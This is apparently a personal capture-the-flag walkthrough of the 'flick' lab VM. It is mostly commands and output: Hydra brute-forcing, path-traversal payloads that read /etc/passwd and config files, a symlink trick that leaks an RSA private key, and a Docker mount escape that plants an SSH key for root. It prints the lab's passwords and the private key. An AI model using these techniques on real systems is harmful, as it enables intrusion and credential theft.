@@ -1,0 +1,569 @@
+flick v1
+time taken: 4 hours 30 mins
+
+nmap:
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2017-07-11 23:03 MDT
+Warning: 212.129.28.21 giving up on port because retransmission cap hit (2).
+Nmap scan report for ctf02.root-me.org (212.129.28.21)
+Host is up (0.092s latency).
+Not shown: 8991 closed ports
+PORT     STATE    SERVICE      VERSION
+22/tcp   open     ssh          OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 04:d0:8d:4d:ee:87:30:e7:60:82:63:d3:a8:6e:4b:ac (DSA)
+|   2048 64:ec:a9:9b:0b:c0:11:d4:08:63:cf:83:e1:db:23:9a (RSA)
+|_  256 2d:32:93:ce:0e:54:3f:84:ee:01:c7:c0:bb:68:e2:02 (ECDSA)
+25/tcp   filtered smtp
+135/tcp  filtered msrpc
+136/tcp  filtered profile
+137/tcp  filtered netbios-ns
+138/tcp  filtered netbios-dgm
+139/tcp  filtered netbios-ssn
+445/tcp  filtered microsoft-ds
+8881/tcp open     galaxy4d?
+| fingerprint-strings: 
+|   DNSStatusRequest, GenericLines, NULL, RPCCheck: 
+|     Welcome to the admin server. A correct password will 'flick' the switch and open a new door:
+|   DNSVersionBindReq: 
+|     Welcome to the admin server. A correct password will 'flick' the switch and open a new door:
+|     version
+|     bind
+|   FourOhFourRequest: 
+|     Welcome to the admin server. A correct password will 'flick' the switch and open a new door:
+|     /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0
+|   GetRequest: 
+|     Welcome to the admin server. A correct password will 'flick' the switch and open a new door:
+|     HTTP/1.0
+|   HTTPOptions: 
+|     Welcome to the admin server. A correct password will 'flick' the switch and open a new door:
+|     OPTIONS / HTTP/1.0
+|   RTSPRequest: 
+|     Welcome to the admin server. A correct password will 'flick' the switch and open a new door:
+|_    OPTIONS / RTSP/1.0
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+(fingerprint)
+Aggressive OS guesses: QEMU user mode network gateway (96%), Konica Minolta 7035 printer (87%), GNU Hurd 0.3 (87%), Bay Networks BayStack 450 switch (software version 3.1.0.22) (86%), Bay Networks BayStack 450 switch (software version 4.2.0.16) (86%), Cabletron ELS100-24TXM Switch or Icom IC-7800 radio transceiver (86%), Cisco Catalyst 1900 switch or RAD IPMUX-1 TDM-over-IP multiplexer (86%), HP 9100c Digital Sender printer (J3113A) (86%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT     ADDRESS
+1   0.38 ms 10.0.2.2
+2   0.40 ms ctf02.root-me.org (212.129.28.21)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 222.12 seconds
+
+interdasting... seems to be something on port 8881.
+
+
+ssh'ing gives us some hex.which gives us some base64, which gives us some base64, which gives us some base64, which gives us some more base64...
+
+i swear I decoded this shit like 10 times until i got this which could not be decoded anymore:
+
+tabupJievas8Knoj
+
+tried this on the ssh, no luuck
+
+try this on port 8881?
+
+Trying 212.129.28.21...
+Connected to ctf02.root-me.org.
+Escape character is '^]'.
+Welcome to the admin server. A correct password will 'flick' the switch and open a new door:
+> tabupJievas8Knoj
+OK: tabupJievas8Knoj
+
+Accepted! The door should be open now :poolparty:
+
+..what the fuck
+
+but refreshing the page now shows a web app. so that "door" must be port 80 that was opened.
+nmap confirms this.
+
+ooo login prompt. sadly not open to sql injection...
+
+but site says "demo credentials have been configured"?
+
+try burteforcing with hydra:
+root@kdog:~/ctf_shit/flick# hydra ctf02.root-me.org http-form-post "/login/login:username=^USER^&password=^PASS^&_token=bCm9eO875SJtXwDhkrPbUcQiykeNa4u1aFU9BYsy:Your username/password combination was incorrect" -l demo -P /media/sf_shared_VM/passwords_john.txt -t 10 -V
+Hydra v8.3 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2017-07-11 23:42:58
+[DATA] max 10 tasks per 1 server, overall 64 tasks, 3135 login tries (l:1/p:3135), ~4 tries per task
+[DATA] attacking service http-post-form on port 80
+[ATTEMPT] target ctf02.root-me.org - login "demo" - pass "12345" - 1 of 3135 [child 0] (0/0)
+[ATTEMPT] target ctf02.root-me.org - login "demo" - pass "abc123" - 2 of 3135 [child 1] (0/0)
+[ATTEMPT] target ctf02.root-me.org - login "demo" - pass "password" - 3 of 3135 [child 2] (0/0)
+.
+.
+.
+[80][http-post-form] host: ctf02.root-me.org   login: demo   password: demo123
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2017-07-11 23:43:14
+
+wow that worked
+
+gives us the option to upload a photo
+
+cannot use uniscan as it shows a bogus directory for any 404 page...smart!
+
+tried uploading shell, found shell uploaded here: 
+
+http://ctf02.root-me.org/image/view/ElowOX04VIoK
+
+could not get shell to launch, just regular text back, even after chmodding
+
+turns out the laravel cookie is base64:
+
+{"iv":"rNh7EkdBj\/RI6iOKrqki9aF\/Kpj97\/CJ2NG+BdQgM8w=","value":"3Mn\/Sjd+ldAc7lsgdJhx1DCRFGyECy4KBHkZ\/MM9nLcx1jAlzL1lKQop+pZ9gPEQFoQP+nsY+As4lsO4S4oG7w==","mac":"55f65e59ebd316df63e2ba1c1fe069a36ce04f9f7dceda39f821d354bd4d924b"}7
+
+the value and iv params seem to be (apparently) bogus .bin files
+
+http://ctf02.root-me.org/image/download?filename=../../../etc/passwd
+
+gave this:
+
+etc/passwd is not valid. 
+
+http://ctf02.root-me.org/image/download?filename=%E2%80%A6.//%E2%80%A6.//....//etc/passwd:
+
+….//….//../etc/passwd is not valid.
+
+hmm, definite LFI
+
+
+http://ctf02.root-me.org/image/download?filename=....//....//....//....//%E2%80%A6./etc/passwd
+
+../../../../…./etc/passwd is not valid. 
+
+so ...// --> ../
+
+
+http://ctf02.root-me.org/image/download?filename=....//....//....//....//etc/passwd
+
+gives a .jpeg. I thought these were useless until i ran them with strings:
+
+it's /etc/passwd!
+
+root:x:0:0:root:/root:/bin/bash
+.
+.
+.
+robin:x:1000:1000:robin,,,:/home/robin:/bin/bash
+mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
+dean:x:1001:1001:,,,:/home/dean:/bin/bash
+
+
+This part took a long time. I looked at the laravel source code at https://github.com/laravel/laravel,
+it turns out that a file outlining database filenames is present in laralev/app/config/database.php
+
+http://ctf02.root-me.org/image/download?filename=....//app/config/database.php
+
+<?php
+return array(
+	|--------------------------------------------------------------------------
+	| PDO Fetch Style
+	|--------------------------------------------------------------------------
+	| By default, database results will be returned as instances of the PHP
+	| stdClass object; however, you may desire to retrieve records in an
+	| array format for simplicity. Here you can tweak the fetch style.
+	'fetch' => PDO::FETCH_CLASS,
+	|--------------------------------------------------------------------------
+	| Default Database Connection Name
+	|--------------------------------------------------------------------------
+	| Here you may specify which of the database connections below you wish
+	| to use as your default connection for all database work. Of course
+	| you may use many connections at once using the Database library.
+	// Jan 2014 note: We have moved away from the old crappy SQLite 2.x database and moved
+	// on to the new and improved MySQL database. So, I will just comment out this as it is
+	// no longer in use
+	//'default' => 'sqlite',
+	'default' => 'mysql',
+	|--------------------------------------------------------------------------
+	| Database Connections
+	|--------------------------------------------------------------------------
+	| Here are each of the database connections setup for your application.
+	| Of course, examples of configuring each database platform that is
+	| supported by Laravel is shown below to make development simple.
+	| All database work in Laravel is done through the PHP PDO facilities
+	| so make sure you have the driver for your particular database of
+	| choice installed on your machine before you begin development.
+	'connections' => array(
+		'sqlite' => array(
+			'driver'   => 'sqlite',
+			'database' => __DIR__.'/../database/production.sqlite', // OLD DATABASE NO LONGER IN USE! <--- IMPORTANT FOR US
+			'prefix'   => '',
+		),
+		'mysql' => array(
+			'driver'    => 'mysql',
+			'host'      => 'localhost',
+			'database'  => 'flick',
+			'username'  => 'flick',
+			'password'  => 'resuddecNeydmar3',
+			'charset'   => 'utf8',
+			'collation' => 'utf8_unicode_ci',
+			'prefix'    => '',
+		),
+		'pgsql' => array(
+			'driver'   => 'pgsql',
+			'host'     => 'localhost',
+			'database' => 'forge',
+			'username' => 'forge',
+			'password' => '',
+			'charset'  => 'utf8',
+			'prefix'   => '',
+			'schema'   => 'public',
+		),
+		'sqlsrv' => array(
+			'driver'   => 'sqlsrv',
+			'host'     => 'localhost',
+			'database' => 'database',
+			'username' => 'root',
+			'password' => '',
+			'prefix'   => '',
+		),
+	|--------------------------------------------------------------------------
+	| Migration Repository Table
+	|--------------------------------------------------------------------------
+	| This table keeps track of all the migrations that have already run for
+	| your application. Using this information, we can determine which of
+	| the migrations on disk haven't actually been run in the database.
+	'migrations' => 'migrations',
+	|--------------------------------------------------------------------------
+	| Redis Databases
+	|--------------------------------------------------------------------------
+	| Redis is an open source, fast, and advanced key-value store that also
+	| provides a richer set of commands than a typical key-value systems
+	| such as APC or Memcached. Laravel makes it easy to dig right in.
+	'redis' => array(
+		'cluster' => false,
+		'default' => array(
+			'host'     => '127.0.0.1',
+			'port'     => 6379,
+			'database' => 0,
+		),
+
+
+let's see the "old database" at http://ctf02.root-me.org/image/download?filename=....//app/database/production.sqlite:
+
+** This file contains an SQLite 2.1 database **
+ "^table
+old_users
+old_users
+CREATE TABLE old_users (
+  username text,
+  password text
+Ipaul
+nejEvOibKugEdof0KebinAw6TogsacPayarkOctIasejbon7Ni7Grocmyalkukvi
+	Jrobin
+JoofimOwEakpalv4Jijyiat5GloonTojatticEirracksIg4yijovyirtAwUjad1
+	Jjames
+scujittyukIjwip0zicjoocAnIltAsh4Vuer4osDidsaiWipOkDunipownIrtOb5
+Idean
+FumKivcenfodErk0Chezauggyokyait5fojEpCayclEcyaj2heTwef0OlNiphAnA
+
+password hashes????
+
+alas, john the ripper could not find hashes, maybe they are actual passwords?
+
+ .o88o. oooo   o8o            oooo        
+ 888 `" `888   `"'            `888        
+o888oo   888  oooo   .ooooo.   888  oooo  
+ 888     888  `888  d88' `"Y8  888 .8P'   
+ 888     888   888  888        888888.    
+ 888     888   888  888   .o8  888 `88b.  
+o888o   o888o o888o `Y8bod8P' o888o o888o 
+                                          
+
+dean@ctf02.root-me.org's password: 
+Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com/
+
+  System information as of Wed Jul 12 09:21:35 SAST 2017
+
+  System load:  0.0               Processes:              87
+  Usage of /:   35.8% of 6.99GB   Users logged in:        0
+  Memory usage: 22%               IP address for eth0:    10.66.2.100
+  Swap usage:   0%                IP address for docker0: 172.17.42.1
+
+  Graph this data and manage this system at:
+    https://landscape.canonical.com/
+
+New release '14.04.3 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+Last login: Sat Aug  2 14:42:15 2014 from 192.168.56.1
+dean@flick:~$ uname -r
+3.11.0-15-generic
+dean@flick:~$ 
+
+YEP. paul, james, and robin don't work, but dean does with the passwoRd given. 
+
+dean@flick:~$ cat message.txt 
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+Hi Dean,
+
+I will be away on leave for the next few weeks. I have asked the admin guys to
+write a quick script that will allow you to read my .dockerfile for flick-
+a-photo so that you can continue working in my absense.
+
+The .dockerfile is in my home, so the path for the script will be something like
+/home/robin/flick-dev/
+
+Please call me if you have any troubles!
+
+- --
+Ciao
+Robin
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
+
+iQIcBAEBAgAGBQJT32ZsAAoJENRCTh/agc2DTNIP/0+ut1jWzk7VgJlT6tsGB0Ah
+yi24i2b+JAVtINzCNgJ+rXUStaAEudTvJDF28b/wZCaFVFoNJ8Q30J03FXo4SRnA
+ZW6HZZIGEKdlD10CcXsQrLMRmWZlBDQnCm4+EMOvavS1uU9gVvcaYhnow6uwZlwR
+enf71LvtS1h0+PrFgSIoItBI4/lx7BiYY9o3hJyaQWkmAZsZLWQpJtROe8wsxb1l
+9o4jCJrADeJBsYM+xLExsXaEobHfKtRtsM+eipHXIWIH+l+xTi8Y1/XIlgEHCelU
+jUg+Hswq6SEch+1T5B+9EPoeiLT8Oi2Rc9QePSZ3n0fe4f3WJ47lEYGLLEUrKNG/
+AFLSPnxHTVpHNO72KJSae0cG+jpj1OKf3ErjdTk1PMJy75ntQCrgtnGnp9xvpk0b
+0xg6cESLGNkrqDGopsN/mgi6+2WKtUuO5ycwVXFImY3XYl+QVZgd/Ntpu4ZjyZUT
+lxqCAk/G1s43s+ySFKSoHZ8c/CuOKTsyn6uwI3NxBZPD04xfzoc0/R/UpIpUmneK
+q9LddBQK4vxPab8i4GNDiMp+KXyfByO864PtKQnCRkGQewanxoN0lmjB/0eKhkmf
+Yer1sBmumWjjxR8TBY3cVRMH93zpIIwqxRNOG6bnnSVzzza5DJuNssppCmXLOUL9
+nZAuFXkGFu6cMMD4rDXQ
+=2moZ
+-----END PGP SIGNATURE-----
+dean@flick:~$ ./read_docker 
+ERROR: A path is required!
+Usage is: ./read_docker /path/to/dockerfile
+
+hmm...
+
+dean@flick:~$ sudo -l
+[sudo] password for dean: 
+Sorry, user dean may not run sudo on flick.
+
+shit
+
+dean@flick:~$ ./read_docker /home/robin/flick-dev/
+# Flick-a-photo dev env
+RUN apt-get update && apt-get install -y php5 libapache2-mod-php5 php5-mysql php5-cli && apt-get clean && rm -rf /var/lib/apt/lists/*
+
+CMD ["/usr/sbin/apache2", "-D", "FOREGROUND"]
+
+can't run that shit unless i'm root
+
+dean@flick:~$ ls -l
+total 16
+-rw-r--r-- 1 root  root  1250 Aug  4  2014 message.txt
+-rwsr-xr-x 1 robin robin 8987 Aug  4  2014 read_docker
+
+ok so this read_docker script is owned by robin
+
+so docker seems to be a tool that allows devs to build and work on apps in some specified context without re-deploying the app, setting permissions, etc...def seems like something that can be exploited
+
+dean@flick:~$ ./read_docker /home/dean
+ERROR: the specified docker file doesn't exist: /home/dean/Dockerfile
+Usage is: ./read_docker /path/to/dockerfile
+
+this script seems to append a "Dockerfile" to the end of the argument
+
+maybe we can fill Dockerfile with something readable?
+
+maybe robin has an ssh key that we can use?
+
+to get something useful, a symlink needed to be created between the Dockerfile and something of use, which turned out to be robin's private ssh key.
+
+
+dean@flick:~$ ln -s /home/robin/.ssh/id_rsa Dockerfile
+dean@flick:~$ ls -l
+total 16
+lrwxrwxrwx 1 dean  dean    23 Jul 12 09:50 Dockerfile -> /home/robin/.ssh/id_rsa
+-rw-r--r-- 1 root  root  1250 Aug  4  2014 message.txt
+-rwsr-xr-x 1 robin robin 8987 Aug  4  2014 read_docker
+
+dean@flick:~$ ./read_docker /home/dean
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAlv/0uKdHFQ4oT06Kp3yg0tL1fFVl4H+iS1UOqds0HrgBCTSw
+ECwVwhrIFJa/u5FOPGst8t35CKo4VWX3KNHXFNVtUXWeQFpe/rB/0wi+k8E8WtXi
+FBjLiFOqTDL0kgXRoQzUPlYg0+LAXo5EbMq+rB2ZgMJTxunJFV2m+uKtbZZRvzU6
+S1Fj6XHh/U0E68d6sZ/+y1UhSJLaFYUQMkfLtjxPa17sPZ+kwB1R4puhVTprfQOk
+CinfW01ot2Rj2HLMR5CpgA28dmxw8W6w0MGtXurTegj1ydFOTgB1/k4XpXnSGNO9
+d2AlVR/NsKDAuYKdgRGFFh91nGZTl1p4em48YwIDAQABAoIBADI3bwhVwSL0cV1m
+jmAC520VcURnFhlh+PQ6lkTQvHWW1elc10yZjKbfxzhppdvYB/+52S8SuPYzvcZQ
+wbCWkIPCMrfLeNSH+V2UDv58wvxaYBsJVEVAtbdhs5nhvEovmzaHELKmbAZrO3R2
+tbTEfEK7GUij176oExKC8bwv1GND/qQBwLtEJj/YVJSsdvrwroCde+/oJHJ76ix4
+Ty8sY5rhKYih875Gx+7IZNPSDn45RsnlORm8fd5EGLML6Vm3iLfwkHIxRdj9DFoJ
+wJcPX7ZWTsmyJLwoHe3XKklz2KW185hIr9M2blMgrPC2ZuTnvBXmEWuy86+xxAB0
+mFXYMdkCgYEAx6yab3huUTgTwReaVpysUEqy4c5nBLKqs6eRjVyC9jchQfOqo5AQ
+l8bd6Xdrk0lvXnVkZK0vw2zwqlk8N/vnZjfWnCa4unnv2CZXS9DLaeU6gRgRQFBI
+JB+zHyhus+ill4aWHitcEXiBEjUHx4roC7Al/+tr//cjwUCwlHk75F0CgYEAwZhZ
+gBjAo9X+/oFmYlgVebfR3kLCD4pVPMz+HyGCyjSj0+ddsHkYiHBhstBtHh9vU+Pn
+JMhrtR9yzXukuyQr/ns1mhEQOUtTaXrsy/1FyRBaISrtcyGAruu5yWubT0gXk2Dq
+rwyb6M6MbnwEMZr2mSBU5l27cTKypFqgcA58l78CgYAWM5vsXxCtGTYhFzXDAaKr
+PtMLBn8v54nRdgVaGXo6VEDva1+C1kbyCVutVOjyNI0cjKMACr2v1hIgbtGiS/Eb
+zYOgUzHhEiPX/dNhC7NCcAmERx/L7eFHmvq4sS81891NrtpMOnf/PU3kr17REiHh
+AtIG1a9pg5pHJ6E6sQw2xQKBgHXeqm+BopieDFkstAeglcK8Fr16a+lGUktojDis
+EJPIpQ65yaNOt48qzXEv0aALh57OHceZd2qZsS5G369JgLe6kJIzXWtk325Td6Vj
+mX+nwxh6qIP2nADkaQOnzrHgtOn4kiruRGbki0AhpfQF46qrssVnwF5Vfcrvmstf
+JqDFAoGBAI9KJamhco8BBka0PUWgJ3R2ZqE1viTvyME1G25h7tJb17cIeB/PeTS1
+Q9KMFl61gpl0J4rJEIakeGpXuehwYAzNBv7n6yr8CNDNkET/cVhp+LCmbS91FwAK
+VP0mqDppzOZ04B9FQD8Af6kUzxzGFH8tAN5SNYSW88I9Z8lVpfkn
+-----END RSA PRIVATE KEY-----
+
+we now have robin's ssh key. 
+
+root@kdog:~/ctf_shit/flick# mv robin /root/.ssh/
+root@kdog:~/ctf_shit/flick# chmod 700 /root/.ssh/robin 
+root@kdog:~/ctf_shit/flick# ssh -i /root/.ssh/robin robin@ctf02.root-me.org
+
+ .o88o. oooo   o8o            oooo        
+ 888 `" `888   `"'            `888        
+o888oo   888  oooo   .ooooo.   888  oooo  
+ 888     888  `888  d88' `"Y8  888 .8P'   
+ 888     888   888  888        888888.    
+ 888     888   888  888   .o8  888 `88b.  
+o888o   o888o o888o `Y8bod8P' o888o o888o 
+                                          
+
+Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com/
+
+  System information as of Wed Jul 12 09:56:49 SAST 2017
+
+  System load:  0.0               Processes:              87
+  Usage of /:   35.8% of 6.99GB   Users logged in:        0
+  Memory usage: 22%               IP address for eth0:    10.66.2.100
+  Swap usage:   0%                IP address for docker0: 172.17.42.1
+
+  Graph this data and manage this system at:
+    https://landscape.canonical.com/
+
+New release '14.04.3 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+Last login: Sat Aug  2 12:43:16 2014 from 192.168.56.1
+robin@flick:~$ 
+
+boom we're in
+
+robin@flick:~$ sudo -l
+Matching Defaults entries for robin on this host:
+    env_reset,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User robin may run the following commands on this host:
+    (root) NOPASSWD: /opt/start_apache/restart.sh
+
+let's not restart this VM...
+
+let's remeber what docker does. it allows for "containers" (environments) to be run for the purposes of building/modifying apps in the context of this "container"
+
+robin@flick:/home/dean$ docker ps -a
+CONTAINER ID        IMAGE               COMMAND             CREATED              STATUS              PORTS               NAMES
+b0f71c63a88c        ubuntu:14.04        /bin/bash           2.942022 years ago   Up 3 minutes                            sharp_shockley  
+
+robin@flick:/home/dean$ docker run  
+07e5ff866bfe    25f11f5fb0cb    463ff6be4238    6ef6f1a66de1    c5881f11ded9    fae16849ebe2    ubuntu:13.10    ubuntu:quantal  
+0f4aac48388f    2758ea31b20b    47dd6d11a49f    9bad880da3d2    dae3606452c3    ubuntu          ubuntu:14.04    ubuntu:raring   
+195eb90b5349    2abd6cab7b39    511136ea3c5a    b7c6da90134e    dfaad36d8984    ubuntu:10.04    ubuntu:14.10    ubuntu:saucy    
+209ea56fda6d    2e64783f16a8    5561dbd1a283    b9e56c8f2cf5    ebc34468f71d    ubuntu:12.04    ubuntu:latest   ubuntu:trusty   
+2318d26665ef    3af9d794ad07    5796a7edb16b    ba5877dc9bec    f127542f0b61    ubuntu:12.10    ubuntu:lucid    ubuntu:utopic   
+25c55ec6c1ab    3db9c44f4520    6cfa4d1f33fb    bac448df371d    fa5288457082    ubuntu:13.04    ubuntu:precise 
+
+hmmmmmm
+
+according to https://stackoverflow.com/questions/32353055/how-to-start-a-stopped-docker-container-with-a-different-command#39329138:
+
+docker run -ti --entrypoint=sh user/test_image
+
+robin@flick:/home/dean$ docker run -it /root:/root ubuntu:14.04
+root@9106945abac1:/# id
+uid=0(root) gid=0(root) groups=0(root)
+root@167c3ed04639:/root# cat flag.txt 
+Errr, you are close, but this is not the flag you are looking for.
+
+cheeky
+
+root@167c3ed04639:/root# cd 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/
+root@167c3ed04639:/root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc# ls
+real_flag.txt
+root@167c3ed04639:/root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc# cat real_flag.txt 
+Congrats!
+
+You have completed 'flick'! I hope you have enjoyed doing it as much as I did creating it :)
+
+ciao for now!
+@leonjza
+
+
+done...seemingly. 
+
+Turns out I only have root in this container, not the actual host OS. this one is bloody hard. I am beside myself.
+
+I had to look this part up because I had no idea how to go about getting root on the host OS, as I 
+have never used docker before.
+turns out it was really simple. just copy my local ssh public key to the rooted machine.
+The cruicial piece of information that I was missing is that writing in the docker instance also 
+writes in the host OS. makes sense when you think about it.
+
+root@19a0d3311d79:/root/.ssh# mkdir authorized_keys
+root@19a0d3311d79:/root/.ssh# echo 'MY_ACTUAL_PUBLIC_KEY' > /root/.ssh/authorized_keys
+root@19a0d3311d79:/root/.ssh# chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys 
+root@19a0d3311d79:/root/.ssh# exit
+exit
+robin@flick:/etc$ exit
+logout
+Connection to ctf02.root-me.org closed.
+root@kdog:~/ctf_shit/flick# ssh root@ctf02.root-me.org
+Warning: the ECDSA host key for 'ctf02.root-me.org' differs from the key for the IP address '212.129.28.21'
+Offending key for IP in /root/.ssh/known_hosts:16
+Matching host key in /root/.ssh/known_hosts:25
+Are you sure you want to continue connecting (yes/no)? yes
+
+
+ .o88o. oooo   o8o            oooo        
+ 888 `" `888   `"'            `888        
+o888oo   888  oooo   .ooooo.   888  oooo  
+ 888     888  `888  d88' `"Y8  888 .8P'   
+ 888     888   888  888        888888.    
+ 888     888   888  888   .o8  888 `88b.  
+o888o   o888o o888o `Y8bod8P' o888o o888o 
+                                          
+
+Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com/
+
+  System information as of Wed Jul 12 11:23:59 SAST 2017
+
+  System load:  0.08              Processes:              89
+  Usage of /:   35.8% of 6.99GB   Users logged in:        0
+  Memory usage: 13%               IP address for eth0:    10.66.2.100
+  Swap usage:   0%                IP address for docker0: 172.17.42.1
+
+  Graph this data and manage this system at:
+    https://landscape.canonical.com/
+
+New release '14.04.3 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+Last login: Wed Jul 12 11:01:39 2017 from 10.66.2.1
+root@flick:~# id
+uid=0(root) gid=0(root) groups=0(root)
+
+
+wew
+
+
+there is another way to get root on the host OS which involves editing a file, /etc/config.py, 
+which originally only restarted the apache service running on 8881. editing it to give root 
+privileges is possible, but it is 4:30 in the morning and I have spent way to much time on this.
+
+
